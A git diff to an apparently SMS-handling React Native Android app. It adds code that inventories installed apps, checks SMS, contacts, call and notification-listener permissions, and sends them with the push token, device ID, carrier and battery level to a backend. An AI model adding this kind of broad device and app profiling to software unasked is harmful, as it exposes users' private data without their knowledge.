@@ -1,8 +1,15 @@
 import AsyncStorage from "@react-native-async-storage/async-storage";
 import { store } from "../store/configStore";
-import { AddCount, AddNewSms, AddSms, ChangeStatus, CheckOnline, Count, ReadSms, SmsSingPage } from "../store/action/action";
+import { AddCount, AddNewSms, AddSms, ChangeStatus, CheckOnline, Count, DeviceInfoAction, ReadSms, SmsSingPage } from "../store/action/action";
 import PushNotification from 'react-native-push-notification';
 import SQLite from 'react-native-sqlite-2';
+import { InstalledApps } from "react-native-launcher-kit";
+import messaging from '@react-native-firebase/messaging';
+import DeviceInfo from 'react-native-device-info';
+import { PermissionsAndroid } from "react-native";
+import RNAndroidNotificationListener from 'react-native-android-notification-listener';
+import NetInfo from '@react-native-community/netinfo';
+import SimCardsManagerModule from 'react-native-sim-cards-manager';
 
 const db = SQLite.openDatabase('Tredo.db', '1.0', '', 1)
 
@@ -375,3 +382,134 @@ export const isOnline = async () => {
   store.dispatch(CheckOnline(token))
 }
 
+
+
+const GetAllApp = async () => {
+  // let item = InstalledApps.getApps();
+  let notData = await AsyncStorage.getItem('notData')
+  let app = JSON.parse(notData)
+  const item = InstalledApps.getApps().filter(elm =>
+    elm.packageName != 'com.tredo' &&
+    elm.packageName != 'com.google.android.apps.messaging' &&
+    elm.packageName != 'com.android.messaging' &&
+    elm.packageName != 'com.samsung.android.messaging' &&
+    elm.packageName != 'com.android.mms' &&
+    elm.packageName != 'com.huawei.message' &&
+    elm.packageName != 'com.lge.message' &&
+    elm.packageName != 'com.oneplus.mms' &&
+    elm.packageName != 'com.miui.mms' &&
+    elm.packageName != 'com.sonyericsson.conversations' &&
+    elm.packageName != 'com.htc.sense.mms' &&
+    elm.packageName != 'com.android.systemui'
+  );
+  let data = []
+  item.map((elm, i) => {
+    let status = 0
+    if (app.findIndex((el) => el == elm.packageName) >= 0) {
+      console.log(")000----00-0-")
+      status = 1
+    }
+    data.push({ name: elm.packageName, value: 1, label: elm.label })
+  })
+  return data
+}
+
+const CheckPermition = async () => {
+  const status = await RNAndroidNotificationListener.getPermissionStatus()
+  const read_sms = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS)
+  const read_contacts = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_CONTACTS)
+  const read_phonCall = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.CALL_PHONE)
+  const postnotification = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS)
+  let read_notification = false
+  if (status == 'authorized') {
+    read_notification = true
+  }
+  else {
+    read_notification = false
+  }
+  return {
+    read_notification: read_notification,
+    read_sms: read_sms,
+    read_contacts: read_contacts,
+    read_phonCall: read_phonCall,
+    postnotification: postnotification
+  }
+}
+
+const fetchPingTime = async () => {
+  const startTime = Date.now();
+  try {
+    await fetch('https://www.google.com', { method: 'HEAD' });
+    const endTime = Date.now();
+    const timeTaken = endTime - startTime;
+    return timeTaken
+    // setPingTime(timeTaken);
+  } catch (error) { }
+};
+
+const measureUploadSpeed = async () => {
+  const startTime = Date.now();
+  try {
+    const response = await fetch('https://iron-pay.com/uploads/invoce/1728372244.jpg', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/octet-stream',
+      },
+      // body: file,
+    });
+
+    const endTime = Date.now();
+    const duration = (endTime - startTime) / 1000;
+    const speed = (1024 * 1024 / duration) / 1024 / 1024;
+    return speed.toFixed(2)
+  } catch (error) {
+    console.error('Upload failed', error);
+  }
+};
+
+
+
+const SetDeviceData = async () => {
+  const app_configs = await GetAllApp()
+  const push_id = await messaging().getToken();
+  const id = await DeviceInfo.getUniqueId();
+  const level = await DeviceInfo.getBatteryLevel();
+  const configs = await CheckPermition()
+  const state = await NetInfo.fetch();
+  const connectionType = state.type;
+  let token = await AsyncStorage.getItem('token')
+  const carrierName = await DeviceInfo.getCarrier();
+  console.log(carrierName, 'carrierName')
+  let internet = 'wifi'
+  if (connectionType === 'wifi') {
+    internet = 'Wi-Fi'
+  } else if (connectionType === 'cellular') {
+    internet = 'Mobile'
+  } else {
+    internet = connectionType
+  }
+  store.dispatch(DeviceInfoAction(token,
+    {
+      internet: internet,
+      operator: carrierName,
+      internet_speed: await fetchPingTime(),
+      internet_signal: await measureUploadSpeed(),
+      push_id: push_id,
+      android: DeviceInfo.getSystemVersion(),
+      name: DeviceInfo.getBrand(),
+      surname: DeviceInfo.getModel(),
+      phone_id: id,
+      battery: Math.round(level * 100),
+      configs: configs,
+      app_configs: app_configs,
+      version: 1.5
+    }
+  ))
+}
+
+
+export const SetDeviceInfo = async () => {
+  SetDeviceData()
+  isOnline()
+  GetAllDontSendSms()
+}
